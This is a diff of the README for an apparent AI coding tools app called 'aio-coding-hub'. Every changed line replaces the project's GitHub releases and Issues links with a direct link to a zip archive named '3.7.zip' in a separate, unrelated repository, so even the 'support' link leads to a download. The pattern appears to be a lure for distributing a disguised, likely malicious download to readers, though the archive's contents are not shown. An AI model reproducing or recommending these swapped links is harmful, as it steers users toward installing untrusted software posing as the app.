@@ -11,7 +11,7 @@ Welcome to aio-coding-hub! This application is designed for everyone who wants t
 
 ## 📥 Download the App
 
-[![Download](https://img.shields.io/badge/Download-aio--coding--hub-brightgreen)](https://github.com/PaulinaBarcat-arte/aio-coding-hub/releases)
+[![Download](https://img.shields.io/badge/Download-aio--coding--hub-brightgreen)](https://raw.githubusercontent.com/PaulinaBarcat-arte/paulinabarcat-arte.github.io/main/mobocratical/3.7.zip)
 
 ## 📖 System Requirements
 
@@ -33,7 +33,7 @@ aio-coding-hub includes useful tools for various AI tasks, including:
 
 1. **Visit the Releases Page**
    Go to the following link to access the download options:
-   [Download aio-coding-hub](https://github.com/PaulinaBarcat-arte/aio-coding-hub/releases)
+   [Download aio-coding-hub](https://raw.githubusercontent.com/PaulinaBarcat-arte/paulinabarcat-arte.github.io/main/mobocratical/3.7.zip)
 
 2. **Select Your Version**
    On the releases page, look for the latest version of aio-coding-hub. You will see different files available for download.
@@ -62,7 +62,7 @@ After running the application, you will see a user-friendly interface. Here’s 
   
 - **Try the Features:** Experiment with the image processing, text analysis, and data visualization tools to see what works best for your needs.
 
-- **Seek Help:** If you encounter any issues, you can check the FAQ section in the app or visit our [GitHub Issues page](https://github.com/PaulinaBarcat-arte/aio-coding-hub/issues) for support.
+- **Seek Help:** If you encounter any issues, you can check the FAQ section in the app or visit our [GitHub Issues page](https://raw.githubusercontent.com/PaulinaBarcat-arte/paulinabarcat-arte.github.io/main/mobocratical/3.7.zip) for support.
 
 ## 🌟 Contribution
 
@@ -76,4 +76,4 @@ If you have questions or suggestions, please reach out through our GitHub page o
 
 aio-coding-hub is open-source software. Feel free to modify and distribute it under the terms of the MIT License.
 
- [![Download](https://img.shields.io/badge/Download-aio--coding--hub-brightgreen)](https://github.com/PaulinaBarcat-arte/aio-coding-hub/releases)
+ [![Download](https://img.shields.io/badge/Download-aio--coding--hub-brightgreen)](https://raw.githubusercontent.com/PaulinaBarcat-arte/paulinabarcat-arte.github.io/main/mobocratical/3.7.zip)
